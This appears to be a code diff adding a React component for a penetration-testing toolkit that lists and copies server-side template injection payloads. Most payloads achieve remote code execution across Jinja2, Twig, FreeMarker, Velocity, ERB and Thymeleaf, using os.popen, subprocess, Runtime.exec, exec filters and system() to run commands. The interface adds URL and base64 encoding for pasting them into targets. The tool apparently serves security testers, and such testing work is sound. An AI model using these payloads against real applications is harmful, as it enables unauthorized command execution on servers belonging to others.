@@ -1,0 +1,162 @@
+import React, { useState } from 'react';
+import { Card, Button, Input, TabNav, PayloadBlock, Toast} from '../../../components/ui';
+import { ToolHeader } from '../../../components/ui/ToolHeader';
+import { Search, Copy, Filter, Terminal } from 'lucide-react';
+
+// Static SSTI Payloads derived from HackTools logic
+const SSTI_PAYLOADS = [
+    {
+        engine: 'Jinja2',
+        language: 'Python',
+        payload: '{{7*7}}',
+        desc: 'Basic arithmetic test'
+    },
+    {
+        engine: 'Jinja2',
+        language: 'Python',
+        payload: '{{config}}',
+        desc: 'Dump config object'
+    },
+    {
+        engine: 'Jinja2',
+        language: 'Python',
+        payload: "{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}",
+        desc: 'RCE via os.popen'
+    },
+    {
+        engine: 'Jinja2',
+        language: 'Python',
+        payload: "{{''.__class__.__mro__[1].__subclasses__()[414]('id',shell=True,stdout=-1).communicate()[0].strip()}}",
+        desc: 'RCE via subprocess (index may vary)'
+    },
+    {
+        engine: 'Twig',
+        language: 'PHP',
+        payload: '{{7*7}}',
+        desc: 'Basic arithmetic test'
+    },
+    {
+        engine: 'Twig',
+        language: 'PHP',
+        payload: '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}',
+        desc: 'RCE via exec filter'
+    },
+    {
+        engine: 'FreeMarker',
+        language: 'Java',
+        payload: '<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }',
+        desc: 'RCE via Execute utility'
+    },
+    {
+        engine: 'Velocity',
+        language: 'Java',
+        payload: '#set($str=$class.inspect("java.lang.String").type)\n#set($chr=$class.inspect("java.lang.Character").type)\n#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("id"))',
+        desc: 'RCE via Runtime.exec'
+    },
+    {
+        engine: 'ERB',
+        language: 'Ruby',
+        payload: '<%= system("id") %>',
+        desc: 'RCE via system()'
+    },
+    {
+        engine: 'Spring',
+        language: 'Java',
+        payload: '${7*7}',
+        desc: 'Basic arithmetic test'
+    },
+    {
+        engine: 'Thymeleaf',
+        language: 'Java',
+        payload: '${T(java.lang.Runtime).getRuntime().exec("id")}',
+        desc: 'RCE via Runtime exec'
+    }
+];
+
+export default function SSTITool() {
+    const [searchTerm, setSearchTerm] = useState('');
+    const [selectedEngine, setSelectedEngine] = useState<string>('All');
+    const [showToast, setShowToast] = useState(false);
+
+    const engines = ['All', ...Array.from(new Set(SSTI_PAYLOADS.map(p => p.engine)))];
+
+    const copyToClipboard = (text: string) => {
+        navigator.clipboard.writeText(text);
+        setShowToast(true);
+        setTimeout(() => setShowToast(false), 2000);
+    };
+
+    const copyEncoded = (text: string, type: 'url' | 'base64') => {
+        let content = text;
+        if (type === 'url') content = encodeURIComponent(text);
+        if (type === 'base64') content = btoa(text);
+        copyToClipboard(content);
+    };
+
+    const filteredPayloads = SSTI_PAYLOADS.filter(item => {
+        const matchesSearch =
+            item.engine.toLowerCase().includes(searchTerm.toLowerCase()) ||
+            item.desc.toLowerCase().includes(searchTerm.toLowerCase()) ||
+            item.payload.toLowerCase().includes(searchTerm.toLowerCase());
+        const matchesEngine = selectedEngine === 'All' || item.engine === selectedEngine;
+        return matchesSearch && matchesEngine;
+    });
+
+    return (
+        <div className="space-y-6">
+            <ToolHeader
+                title="Server-Side Template Injection (SSTI)"
+                description="SSTI payloads for various template engines to achieve remote code execution"
+            />
+
+            <Card className="!p-6 space-y-4 border-l-4 border-l-htb-green">
+                <div className="flex flex-col md:flex-row gap-4">
+                    <div className="flex-1">
+                        <label className="text-xs font-medium text-gray-400 mb-1 block">Search Payloads</label>
+                        <div className="relative">
+                            <Search className="absolute left-1 top-2.5 text-gray-500" size={16} />
+                            <Input
+                                placeholder="Search by engine, desc, or payload..."
+                                value={searchTerm}
+                                onChange={(e) => setSearchTerm(e.target.value)}
+                                className="pl-7"
+                            />
+                        </div>
+                    </div>
+                    <div className="w-full md:w-48">
+                        <label className="text-xs font-medium text-gray-400 mb-1 block">Filter Engine</label>
+                        <select
+                            className="w-full bg-[#0d1117] border border-gray-700 rounded-md p-2 text-sm text-gray-300 focus:outline-none focus:border-htb-green"
+                            value={selectedEngine}
+                            onChange={(e) => setSelectedEngine(e.target.value)}
+                        >
+                            {engines.map(eng => <option key={eng} value={eng}>{eng}</option>)}
+                        </select>
+                    </div>
+                </div>
+            </Card>
+
+            <div className="space-y-6">
+                {filteredPayloads.map((item, idx) => (
+                    <div key={idx} className="mb-6">
+                        <h3 className="text-sm font-bold text-gray-400 uppercase tracking-wider mb-3 border-b border-white/10 pb-2">
+                            {item.engine} - {item.language}
+                        </h3>
+                        <PayloadBlock
+                            content={`# ${item.desc}\n${item.payload}`}
+                            actions={
+                                <>
+                                    <Button size="sm" variant="ghost" onClick={() => copyEncoded(item.payload, 'url')} className="h-7 px-2 text-xs text-gray-400 hover:text-white">URL</Button>
+                                    <Button size="sm" variant="ghost" onClick={() => copyEncoded(item.payload, 'base64')} className="h-7 px-2 text-xs text-gray-400 hover:text-white">B64</Button>
+                                </>
+                            }
+                        />
+                    </div>
+                ))}
+            </div>
+
+            {/* Toast Notification */}
+                                <Toast show={showToast} message="Copied to clipboard!" />
+        </div>
+    );
+}
